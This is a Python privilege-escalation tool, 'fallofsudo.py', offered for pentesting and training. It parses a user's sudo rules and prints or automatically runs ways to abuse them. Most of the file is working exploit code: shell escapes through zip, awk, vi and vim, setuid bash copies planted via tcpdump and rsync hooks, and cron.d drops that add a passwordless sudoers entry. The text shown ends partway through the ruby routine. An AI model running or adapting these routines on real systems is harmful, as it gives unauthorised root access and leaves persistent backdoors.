#!/usr/bin/env python
# -*- coding: utf-8 -*-

###############################################################################################################
# Author: Paragonsec (Quentin) @ CyberOne
# Contributor: rmirch (A practice VM will be coming sometime from both of us... oneday)
# Title: fallofsudo.py
# Version: 1.1
# Usage Example: python fallofsudo.py
# Description: This script obtains users Sudo rules and provides ways to abuse them. 
#
# STATUS: 44 SUDO RULES
###############################################################################################################

import getpass
import os
import subprocess
import sys
import argparse
from subprocess import call
from time import sleep
from pprint import pprint

# Arguments
parser = argparse.ArgumentParser(description="This tool attempts to exploit bad sudo rules or shows you how to do it yourself!")


parser.add_argument("-a", "--autopwn",
                  help="This option will engage the autopwn features if they are present", action="store_true")
parser.add_argument("-i", "--info",
                  help="This option will show you how to pwn the sudo rule instead of doing it automatically", action="store_true")

# Check to ensure at least one argument has been passed
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)

args = parser.parse_args()

# Global Variables
global info
global autopwn

#Colors
OKRED = '\033[91m'
OKGREEN = '\033[92m'
OKBLUE = '\033[94m'
OKYELLOW = '\033[93m'
ENDC = '\033[0m'


# Banner
banner = ("""
  █████▒▄▄▄       ██▓     ██▓        ▒█████    █████▒     ██████  █    ██ ▓█████▄  ▒█████  
▓██   ▒▒████▄    ▓██▒    ▓██▒       ▒██▒  ██▒▓██   ▒    ▒██    ▒  ██  ▓██▒▒██▀ ██▌▒██▒  ██▒
▒████ ░▒██  ▀█▄  ▒██░    ▒██░       ▒██░  ██▒▒████ ░    ░ ▓██▄   ▓██  ▒██░░██   █▌▒██░  ██▒
░▓█▒  ░░██▄▄▄▄██ ▒██░    ▒██░       ▒██   ██░░▓█▒  ░      ▒   ██▒▓▓█  ░██░░▓█▄   ▌▒██   ██░
░▒█░    ▓█   ▓██▒░██████▒░██████▒   ░ ████▓▒░░▒█░       ▒██████▒▒▒▒█████▓ ░▒████▓ ░ ████▓▒░
 ▒ ░    ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░   ░ ▒░▒░▒░  ▒ ░       ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ 
 ░       ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░ ▒ ▒░  ░         ░ ░▒  ░ ░░░▒░ ░ ░  ░ ▒  ▒   ░ ▒ ▒░ 
 ░ ░     ░   ▒     ░ ░     ░ ░      ░ ░ ░ ▒   ░ ░       ░  ░  ░   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ▒  
             ░  ░    ░  ░    ░  ░       ░ ░                   ░     ░        ░        ░ ░  
                                                                           ░   
""")

# Obtaining Username
username = getpass.getuser()

# Setting output directory
directory = "Output"
if not os.path.exists(directory):
    os.makedirs(directory)

# pwnit files	
pwncron_script = "/tmp/pwncron"
pwncron_crond = "/etc/cron.d/pwncron"
pwnsudoers_file = "/etc/sudoers.d/pwnage"
pwnage_script = "/tmp/pwnage.sh"

pid = os.getpid()
pwnage_complete_file = f"/tmp/pwnage_complete_{pid}"
sudorules = {}

def main():
    print(OKRED + banner + ENDC)
    print(OKGREEN + "Author: " + ENDC + "paragonsec @ CyberOne (https://www.criticalstart.com)")
    print(OKGREEN + "Contributors: " + ENDC + "rmirch, roman-mueller, caryhooper, jabarber")
    print(OKGREEN + "Version: " + ENDC + "2.1")
    print(OKGREEN + "Description: " + ENDC + "This program aids pentesters in conducting privilege escalation on Linux by abusing sudo. Use for good or training purposes ONLY!\n")
    sudopwner()
	
def sleep_and_display(seconds, trigger_file = ''):
    for i in range(seconds):
        print('.', end='', flush=True)
        if trigger_file:
            if os.path.exists(trigger_file):
                break
        sleep(1)
    print()

def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = ""):
        
    if dry_run:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] !!! SIMULATION !!!" + ENDC)

    print(OKGREEN + f"\n[!] Pwning the {rule} rule now!!!" + ENDC)
    print(OKGREEN + "\n[!] Creating malicious file!" + ENDC)

    # Save the updated script
    pwncron_script_data = f"*/1 * * * * root {pwnage_script}\n"
    if dry_run:
        print(OKBLUE + f"[+] Create cron.d temp file in {pwncron_script}: " + ENDC)
        print(OKRED + f"[*] {pwncron_script_data}" + ENDC)
        print(OKBLUE + f"[+] Change file permissions on {pwncron_script}: " + ENDC)
        print(OKRED + f"[*] chmod 644 {pwncron_script}" + ENDC)
    else:
        with open(pwncron_script, 'w') as output_file:
            output_file.write(pwncron_script_data)
        os.chmod(pwncron_script, 0o644)

    # Save the updated script
    if dry_run:
        print(OKBLUE + f"[+] Create pwnage temp file in {pwnage_script}: " + ENDC)
        print(OKRED + f"[*] {pwnage_script_data}" + ENDC)
        print(OKBLUE + f"[+] Change file permissions on {pwnage_script}: " + ENDC)
        print(OKRED + f"[*] chmod 755 {pwnage_script}" + ENDC)
    else:
        pwnage_script_data += f"touch {pwnage_complete_file}\n"
        with open(pwnage_script, 'w') as output_file:
            output_file.write(pwnage_script_data)
        os.chmod(pwnage_script, 0o755)
        sleep(0.5)

    print(OKGREEN + "\n[!] Creating malicious cron file!" + ENDC)
    if dry_run:
        print(OKBLUE + f"[+] Exploit It: " + ENDC)
        print(OKRED + f"[*] {exploit_cmd}" + ENDC)
    else:
        call(exploit_cmd, shell=True)
        sleep(0.5)

    print(OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!\n  # Note: The cron watchdog timer may take up to 10 minutes to capture new entries" + ENDC)

    if dry_run:
        print(OKBLUE + f"[+] Test if you have full root access: " + ENDC)
        print(OKRED + f"[*] sudo id -a" + ENDC)
    else:
        sleep_and_display(60, pwnage_complete_file)
        print(OKGREEN + "\n[!] OK! DO WE HAVE ROOT? sudo id -a" + ENDC)
        call("sudo id -a",shell=True)
        print("\n")

    if comments:
        print(OKYELLOW + f"\n[!] Comment! {comments}" + ENDC)
              
    if dry_run:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)

# Function for the y/n questions
def ask_user(answer):
    yes = set(['yes','y',''])
    no = set(['no','n'])

    while True:
        choice = input(answer).lower()
        if choice in yes:
            return True
        elif choice in no:
            return False
        else:
            print("Please respond with 'yes' or 'no'\n")


# Main section for sudo pwnage
def sudopwner():
    global sudorules

    print(OKBLUE + "[+] Obtaining sudo rules for user " + username + ENDC + "\n")

    # Obtaining SUDO rules
    sudofile()
	
    # Print contents of sudo rules
    sudorules = sudoparse()

    # Identifying sudo rules and choosing a potential pwnage for that rule
    print(OKBLUE + "\n[+] Identifying potential pwnage... \n" + ENDC)

    # Options for the user to choose which sudo rule they wish to abuse
    #for item in set(choices):
    for itemrec in sudorules.items():
        item = itemrec[0]
        if (item == "all") or (item == "sh") or (item == "bash") or (item == "ksh") or (item == "zsh"):
            print(OKRED + "[!] Vulnerable sudo rule [EASY TO PWN]: " + ENDC + item)
        else:
            print(OKRED + "[!] Vulnerable sudo rule: " + ENDC + item)
    
    question = input("\n" + OKBLUE + "[?] Enter name of sudo rule you wish to pwn: " + ENDC)

    if question == "all":
        all(sudorules[question]["runas_user"])
    elif question == "zip":
        zip(sudorules[question]["runas_user"])
    elif question == "find":
        find(sudorules[question]["runas_user"])
    elif question == "tcpdump":
        tcpdump(sudorules[question]["runas_user"])
    elif question == "rsync":
        rsync(sudorules[question]["runas_user"])
    elif question == "python":
        python(sudorules[question]["runas_user"])
    elif question == "python2":
        python2(sudorules[question]["runas_user"])
    elif question == "python3":
        python3(sudorules[question]["runas_user"])
    elif question == "vi":
        vi(sudorules[question]["runas_user"])
    elif question == "nmap":
        nmap(sudorules[question]["runas_user"])
    elif question == "awk":
        awk(sudorules[question]["runas_user"])
    elif question == "vim":
        vim(sudorules[question]["runas_user"])
    elif question == "perl":
        perl(sudorules[question]["runas_user"])
    elif question == "ruby":
        ruby(sudorules[question]["runas_user"])
    elif question == "bash":
        bash(sudorules[question]["runas_user"])
    elif question == "nc":
        nc(sudorules[question]["runas_user"])
    elif question == "less":
        less(sudorules[question]["runas_user"])
    elif question == "more":
        more(sudorules[question]["runas_user"])
    elif question == "man":
        man(sudorules[question]["runas_user"])
    elif question == "gdb":
        gdb(sudorules[question]["runas_user"])
    elif question == "ftp":
        ftp(sudorules[question]["runas_user"])
    elif question == "smbclient":
        smbclient(sudorules[question]["runas_user"])
    elif question == "sed":
        sed(sudorules[question]["runas_user"])
    elif question == "mysql":
        mysql(sudorules[question]["runas_user"])
    elif question == "tar":
        tar(sudorules[question]["runas_user"])
    elif question == "wget":
        wget()
    elif question == "curl":
        curl()
    elif question == "mv":
        mv()
    elif question == "tee":
        tee()
    elif question == "scp":
        scp()
    elif question == "ssh":
        ssh(sudorules[question]["runas_user"])
    elif question == "cp":
        cp()
    elif question == "dd":
        dd()
    elif question == "crontab":
        crontab()
    elif question == "chown":
        chown()
    elif question == "chmod":
        chmod()
    elif question == "cat":
        cat(sudorules[question]["runas_user"])
    elif question == "mount":
        mount()
    elif question == "facter":
        facter(sudorules[question]["runas_user"])
    elif question == "apt-get":
        aptget()
    elif question == "sh":
        sh(sudorules[question]["runas_user"])
    elif question == "ksh":
        ksh(sudorules[question]["runas_user"])
    elif question == "zsh":
        zsh(sudorules[question]["runas_user"])
    elif question == "nano":
        nano(sudorules[question]["runas_user"])
    elif question == "journalctl":
        journalctl(sudorules[question]["runas_user"])
    elif question == "dmesg":
        dmesg(sudorules[question]["runas_user"])
    elif question == "nice":
        nice(sudorules[question]["runas_user"])
    else:
        print(OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC)
        sys.exit()

# Saving sudo rules to a csv file for easy parsing
def sudofile():

    # File to save sudo rules output
    fname = "Output/sudorules.txt"
    f = open(fname, "wb+")

    # run the sudo -ll command
    # Update suggested by jesmith
    try:
        sudoll = subprocess.check_output(['sudo' , '-ll'])
    except subprocess.CalledProcessError as e:
        print(e.output)
        sys.exit(1)

    sudoll = subprocess.check_output(['sudo' , '-ll'])

    # Saving sudoll output to file
    f.write(sudoll)
    f.close
    

# Used to parse the contents of the sudo output
def sudoparse():
     
    sudooutput = []
    commands_block = 0
    commands_seen = set()  # To track 'cmd' values we've already appended

    # Loop through the SUDO rules gathed earlier
    with open('Output/sudorules.txt', 'r') as sudoers:
        for line in sudoers:
            line = line.strip()
            if not line.startswith('Sudoers'):
                continue
            runas_user = runas_group = options = cmd = None
            for line in sudoers:
                line = line.strip()
                k = line.split(':')[-1].strip()
                if line.lower().startswith('runasusers'):
                    runas_user = k
                elif line.lower().startswith('runasgroups'):
                    runas_group = k
                elif line.lower().startswith('options'):
                    options = k
                elif line.lower().startswith('commands') :
                    commands_block = 1
                elif commands_block == 1:
                    fullcmd = line.strip()
                    cmd = fullcmd.split('/')[-1].split(' ')[0]
                    if fullcmd and not fullcmd.startswith('Sudoers entry'):
                        # Check if we have already seen this cmd
                        if cmd in commands_seen:
                            continue  # Skip if the cmd already exists
                        # If it's a new cmd, add it to the set and append the dict to the list
                        commands_seen.add(cmd)                        
                        sudooutput.append({"runas_user": runas_user, "runas_group": runas_group, "options": options, "cmd": cmd,"fullcmd": fullcmd})

    sudooutput_dict = {item['cmd']: {k: v for k, v in item.items() if k != 'cmd'} for item in sudooutput}
    # pprint(sudooutput_dict)

    # Printing out SUDO rules for the user
    print(OKGREEN + "[!] " + username + " has the following sudo rules:" + ENDC)
    # for item in sudooutput_dict.items():
    #     print("start\n")
    #     pprint(sudooutput_dict[item[0]])
    #     print("ready\n")
    for itemrec in sudooutput_dict.items():
        item = sudooutput_dict[itemrec[0]]
        print(OKGREEN + "\n[!] RunAsUsers: " + ENDC + item['runas_user'])
        if item['runas_group'] != None:
            print(OKGREEN + "[!] RunAsGroups: " + ENDC + item['runas_group'])
        if item['options'] != None:
            print(OKGREEN + "[!] Options: " + ENDC + item['options'])
        print(OKGREEN + "[!] Commands: " + ENDC + item['fullcmd'])

    return sudooutput_dict

# SUDO zip Rule Pwnage
def zip(zip_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First we need to create a empty file to pass to the zip command: " + ENDC)
        print(OKRED + " [*] touch /tmp/foo" + ENDC)
        print(OKBLUE + "[2] Finally we will execute the sudo rule using the unzip-command argument: " + ENDC)
        if (zip_user == "ALL") or (zip_user == "root"):
            print(OKRED + " [*] sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + zip_user + " zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + '\n[?] Do you wish to abuse the zip rule? ' + ENDC)

        if question == True:

            # First step of pwnage for zip
            print(OKGREEN + "\n[!] First Step: " + ENDC + "Creating /tmp/foo")
            call('touch /tmp/foo', shell=True)
    
            sleep(0.5)

            # Exploit the sudo rule zip
            print(OKGREEN + "[!] Pwning ZIP rule now!!!" + ENDC)
            if (zip_user == "ALL") or (zip_user == "root"):
                print(OKGREEN + "\n[!] Getting shell as root!" + ENDC)
                call('sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"', shell=True)
            else:
                print(OKGREEN + "\n[!] Getting shell as " + zip_user + "!" + ENDC)
                call('sudo -u ' + zip_user + ' zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"', shell=True)
        
        elif question == False:
            sudopwner()


# SUDO ALL Rule Pwnage
def all(all_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type one of the two commands: " + ENDC)
        print(OKRED + "[*] sudo -i" + ENDC)
        if (all_user == "ALL") or (all_user == "root"):
            print(OKRED + "[*] sudo su" + ENDC)
        else:
            print(OKRED + "[*] sudo su " + all_user + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()
    
    elif args.autopwn:
    
        question = ask_user( OKRED + '\n[?] Do you wish to abuse the ALL/ALL rule? ' + ENDC)

        if question == True:

            # Exploit the sudo rule ALL/ALL
            print(OKGREEN + "\n[!] Pwning the ALL/ALL rule now!!!" + ENDC)
        
            print(OKGREEN + "\n[!] Executing 'sudo su' to gain shell!" + ENDC)
            if all_user == "ALL":
                print(OKGREEN + "\n[!] Gaining shell as root!" + ENDC)
                call('sudo su', shell=True)
            else:
                print(OKGREEN + "\n[!] Gaining shell as " + all_user + "!" + ENDC)
                call('sudo su ' + all_user, shell=True)
    
        elif question == False:
            sudopwner()


# SUDO find Rule Pwnage
def find(find_user):

    rule = "find"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} {pwncron_script}  -exec chown root:root {pwncron_script} \; ;sudo {cmd} {pwncron_script}  -exec cp {pwncron_script} {pwncron_crond} \;"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO tcpdump Rule Pwnage
def tcpdump(tcpdump_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC)
        print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC)
        print(OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[3] Next we will abuse the packet rotate feature of TCPDUMP in order to execute our malicious script: " + ENDC)
        if (tcpdump_user == "ALL") or (tcpdump_user == "root"):
            print(OKRED + " [*] sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user + ENDC)
        print(OKBLUE + "[4] Finally execute your /tmp/pwnage file that was created!" + ENDC)
        print(OKRED + " [*] ./pwnage" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + '\n[?] Do you wish to abuse the tcpdump rule? ' + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC)
            print(OKGREEN + "\n[!] Creating malicous file!" + ENDC)
            call("echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh",shell=True)

            sleep(0.5)

            print(OKGREEN + "\n[!] Running TCPDUMP packet rotate to execute our malicious script (read the source to see the payload)!" + ENDC)
            if (tcpdump_user == "ALL") or (tcpdump_user == "root"):
                print(OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC)
                call("sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root", shell=True)
            else:
                print(OKGREEN + "\n[!] Creating setuid shell as " + tcpdump_user + "!" + ENDC)
                call("sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user, shell=True)

            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)

        elif question == False:
            sudopwner()


# SUDO rsync Rule Pwnage
def rsync(rsync_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC)
        print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC)
        print(OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[3] Next we need to create a empty file to pass to the rsync command: " + ENDC)
        print(OKRED + " [*] touch /tmp/aaa" + ENDC)
        print(OKBLUE + "[4] Next we will execute the rsync command in order to run our evil.sh script: " + ENDC)
        if (rsync_user == "ALL") or (rsync_user == "root"):
            print(OKRED + " [*] sudo rsync -e /tmp/evil.sh <username> @127.0.0.1:/tmp/aaa bbb" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + rsync_user + " rsync -e /tmp/evil.sh <username> @127.0.0.1:/tmp/aaa bbb" + ENDC)
        print(OKBLUE + "[5] Finally execute your /tmp/pwnage file that was created!" + ENDC)
        print(OKRED + " [*] ./pwnage" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the rsync rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC)
            print(OKGREEN + "\n[!] Creating malicious file!" + ENDC)
            call("echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print(OKGREEN + "\n[!] Creating /tmp/aaa file!" + ENDC)
            call("touch /tmp/aaa",shell=True)

            sleep(0.5)

            print(OKGREEN + "\n[!] Running rsync command!" + ENDC)
            
            if (rsync_user == "ALL") or (rsync_user == "root"):
                print(OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC)
                call("sudo rsync -e /tmp/evil.sh " + username + "@127.0.0.1:/tmp/aaa bbb", shell=True)
            else:
                print(OKGREEN + "\n[!] Creating setuid shell as " + rsync_user + "!" + ENDC)
                call("sudo -u " + rsync_user + " rsync -e /tmp/evil.sh " + username + "@127.0.0.1:/tmp/aaa bbb", shell=True)

            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)

        if question == False:
            sudopwner()

# SUDO awk Rule Pwnage
def awk(awk_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (awk_user == "ALL") or (awk_user == "root"):
            print(OKRED + "[*] sudo awk 'BEGIN {system('/bin/bash')}'" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + awk_user + " awk 'BEGIN {system('/bin/bash')}'" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the awk rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the awk rule now!!!" + ENDC)
            if (awk_user == "ALL") or (awk_user == "root"):
                print(OKGREEN + "\n[!] Getting shell as root!" + ENDC)
                call("sudo awk 'BEGIN {system('/bin/bash')}'", shell=True)
            else:
                print(OKGREEN + "\n[!] Getting shell as " + awk_user + "!" + ENDC)
                call("sudo -u " + awk_user + " awk 'BEGIN {system('/bin/bash')}", shell=True)

        if question == False:
            sudopwner()


# SUDO nmap Rule Pwnage
def nmap(nmap_user):

    rule = "nmap"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"""
    echo "os.execute('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.nse
    sudo {cmd} --script=/tmp/pwnage.nse
    """
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO vi Rule Pwnage
def vi(vi_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (vi_user == "ALL") or (vi_user == "root"):
            print(OKRED + "[*] sudo vi -c ':shell'" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + vi_user + " vi -c ':shell'" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the vi rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the vi rule now!!!" + ENDC)

            if (vi_user == "ALL") or (vi_user == "root"):
                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo vi -c ':shell'", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtaining shell as " + vi_user + "!" + ENDC)
                call("sudo -u " + vi_user + " vi -c ':shell'", shell=True)

        if question == False:
            sudopwner()


# SUDO vim Rule Pwnage
def vim(vim_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (vim_user == "ALL") or (vim_user == "root"):
            print(OKRED + "[*] sudo vim -c ':shell'" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + vim_user + " vim -c ':shell'" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] DO you wish to abise the vim rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the vim rule now!!!" + ENDC)

            if (vim_user == "ALL") or (vim_user == "root"):
                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo vim -c ':shell'", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtaining shell as " + vim_user + "!" + ENDC)
                call("sudo -u " + vim_user + " vim -c ':shell'", shell=True)

        if question == False:
            sudopwner()


# SUDO python Rule Pwnage
def python(python_user):

    rule = "python"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"""
    echo "import os\nos.system('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.{pid}
    sudo {cmd} /tmp/pwnage.{pid}
    """
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO python2 Rule Pwnage
def python2(python_user):

    rule = "python2"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"""
    echo "import os\nos.system('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.{pid}
    sudo {cmd} /tmp/pwnage.{pid}
    """
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()

# SUDO python3 Rule Pwnage
def python3(python_user):

    rule = "python3"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"""
    echo "import os\nos.system('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.{pid}
    sudo {cmd} /tmp/pwnage.{pid}
    """
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO perl Rule Pwnage
def perl(perl_user):

    rule = "perl"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} -e 'system(\"cp {pwncron_script} {pwncron_crond}\")'"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO ruby Rule Pwnage
def ruby(ruby_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First create a malicious ruby script: " + ENDC)
        print(OKRED + " [*] echo 'exec '/bin/bash';' > /tmp/pwnage.rb" + ENDC)
        print(OKBLUE + "[2] Finally execute that ruby script to get your shell: " + ENDC)
        if (ruby_user == "ALL") or (ruby_user == "root"):
            print(OKRED + " [*] sudo ruby /tmp/pwnage.rb" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + ruby_user + " ruby /tmp/pwnage.rb" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the ruby rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the ruby rule now!!!" + ENDC)
            print(OKGREEN + "[!] Creating the malicious file now!" + ENDC)

            call("echo 'exec '/bin/bash';' > /tmp/pwn.rb", shell=True)

            print(OKGREEN + "[!] Obtaining shell!" + ENDC)

            if (ruby_user == "ALL") or (ruby_user == "root"):
